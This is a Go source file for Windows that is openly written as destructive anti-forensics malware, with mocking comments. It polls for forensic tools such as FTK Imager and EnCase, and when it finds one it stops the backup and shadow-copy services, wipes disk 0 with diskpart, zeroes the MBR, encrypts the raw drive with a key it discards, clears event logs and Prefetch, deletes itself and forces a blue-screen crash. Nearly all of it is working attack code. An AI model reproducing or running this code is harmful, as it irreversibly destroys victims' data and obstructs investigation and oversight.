package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	// Size of the master boot record (MBR)
	mbrSize = 512
	// Physical Drive
	drive = "\\\\.\\PhysicalDrive0"
	// Time in between scans
	scanInterval = 5 * time.Second
)

// List of forensic tools to monitor for
var forensicTools = []string{
	"FTK Imager",
	"Autopsy",
	"EnCase",
	"X-Ways Forensics",
}

// ensureAdmin ensures the program is running with elevated privileges
func ensureAdmin() {
	cmd := exec.Command("net", "session")
	if err := cmd.Run(); err != nil {
		// This relaunches the program with administrator privileges
		exe, _ := os.Executable()
		err := exec.Command("runas", "/user:Administrator", exe).Start()
		if err != nil {
			fmt.Println("Failed to restart as administrator:", err)
			os.Exit(1)
		}
		fmt.Println("Program restarted with administrator privileges.")
		os.Exit(0)
	}
}

// stopServices... stops interfering services (wow, really?)
func stopServices() {
	services := []string{"VSS", "wbengine", "BITS"}
	for _, service := range services {
		fmt.Printf("Stopping service: %s\n", service)
		exec.Command("net", "stop", service).Run()
	}
}

// unmountVolume unmounts the volume to release disk locks (so intuitive!)
func unmountVolume() {
	fmt.Println("Unmounting volume...")
	cmd := exec.Command("diskpart")
	cmd.Stdin = strings.NewReader("select disk 0\nclean\nexit")
	cmd.Run()
}

// overwriteMBR overwrites the Master Boot Record (MBR) with zeroes ("uh oh!! That's not supposed to look like that")
func overwriteMBR(drive string) error {
	fmt.Println("Overwriting the Master Boot Record (MBR)...")

	file, err := syscall.CreateFile(syscall.StringToUTF16Ptr(drive),
		syscall.GENERIC_WRITE, syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE, nil, syscall.OPEN_EXISTING, 0, 0)
	if err != nil {
		return fmt.Errorf("failed to access %s: %v", drive, err)
	}
	defer syscall.CloseHandle(file)

	mbrData := make([]byte, mbrSize)
	var written uint32
	err = syscall.WriteFile(file, mbrData, &written, nil)
	if err != nil {
		return fmt.Errorf("failed to write to MBR: %v", err)
	}
	fmt.Println("MBR successfully overwritten.")
	return nil
}

// encryptDrive encrypts the entire drive using AES (256 bit CBC mode)
func encryptDrive(drive string) error {
	fmt.Printf("Encrypting drive: %s\n", drive)

	file, err := syscall.CreateFile(syscall.StringToUTF16Ptr(drive),
		syscall.GENERIC_READ|syscall.GENERIC_WRITE, 0, nil, syscall.OPEN_EXISTING, 0, 0)
	if err != nil {
		return fmt.Errorf("failed to access %s: %v", drive, err)
	}
	defer syscall.CloseHandle(file)

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("failed to generate encryption key: %v", err)
	}
	fmt.Printf("Generated encryption key: %x\n", key)

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("failed to create AES cipher: %v", err)
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := rand.Read(iv); err != nil {
		return fmt.Errorf("failed to generate IV: %v", err)
	}
	stream := cipher.NewCBCEncrypter(block, iv)

	sector := make([]byte, 4096)
	for {
		var bytesRead uint32
		err := syscall.ReadFile(file, sector, &bytesRead, nil)
		if err != nil && err != io.EOF {
			return fmt.Errorf("failed to read sector: %v", err)
		}
		if bytesRead == 0 {
			break
		}
		stream.CryptBlocks(sector, sector)

		var bytesWritten uint32
		err = syscall.WriteFile(file, sector, &bytesWritten, nil)
		if err != nil {
			return fmt.Errorf("failed to write encrypted sector: %v", err)
		}
	}

	fmt.Println("Drive encryption complete.")
	return nil
}

// eraseLogs clears system logs ("HEY! WHERE DID MY LOGS GO!")
func eraseLogs() {
	fmt.Println("Erasing system logs...")
	exec.Command("wevtutil", "cl", "Application").Run()
	exec.Command("wevtutil", "cl", "System").Run()
	exec.Command("wevtutil", "cl", "Security").Run()
	exec.Command("cmd", "/C", "del /Q %SystemRoot%\\Prefetch\\*").Run()
	fmt.Println("Logs erased.")
}

// selfDelete deletes the program itself from the disk (Bye-bye!)
func selfDelete() {
	fmt.Println("Deleting program...")
	exePath, err := os.Executable()
	if err == nil {
		os.Remove(exePath)
	}
}

// triggerBSOD triggers a Blue Screen of Death with hard errors (Haha so sad! :,( )
func triggerBSOD() error {
	fmt.Println("Triggering system crash (BSOD)...")

	ntdll := syscall.MustLoadDLL("ntdll.dll")
	rtlAdjustPrivilege := ntdll.MustFindProc("RtlAdjustPrivilege")
	ntRaiseHardError := ntdll.MustFindProc("NtRaiseHardError")

	// Adjust privileges to allow raising hard errors
	var bl bool
	r1, _, err := rtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&bl)))
	if r1 != 0 {
		return fmt.Errorf("failed to adjust privilege: %v", err)
	}

	// These sure ain't soft!!
	var response uint32
	r2, _, err := ntRaiseHardError.Call(
		0xc0000420, // STATUS_SYSTEM_PROCESS_TERMINATED
		0,          // NumberOfParameters
		0,          // UnicodeStringParameterMask
		0,          // Parameters
		6,          // ValidResponseOption (6 = Shutdown system)
		uintptr(unsafe.Pointer(&response)),
	)
	if r2 != 0 {
		return fmt.Errorf("failed to raise hard error: %v", err)
	}

	return nil
}

// isForensicToolRunning checks if any forensic tool is running
func isForensicToolRunning() (bool, string) {
	cmd := exec.Command("tasklist")
	output, _ := cmd.Output()
	for _, tool := range forensicTools {
		if strings.Contains(strings.ToLower(string(output)), strings.ToLower(tool)) {
			return true, tool
		}
	}
	return false, ""
}

func main() {
	ensureAdmin() // Ensure the program is running with administrator privileges

	for {
		found, tool := isForensicToolRunning()
		if found {
			fmt.Printf("Forensic tool detected: %s\n", tool)
			stopServices()      // Stop interfering services
			unmountVolume()     // Unmount the volume
			overwriteMBR(drive) // Overwrite the MBR
			encryptDrive(drive) // Encrypt the entire drive HAHA
			eraseLogs()         // Erase system logs
			selfDelete()        // Self-delete the program
			triggerBSOD()       // Trigger a BSOD (hopefully... or just crash the system!)
			break
		}
		time.Sleep(scanInterval)
	}
}

// The End!
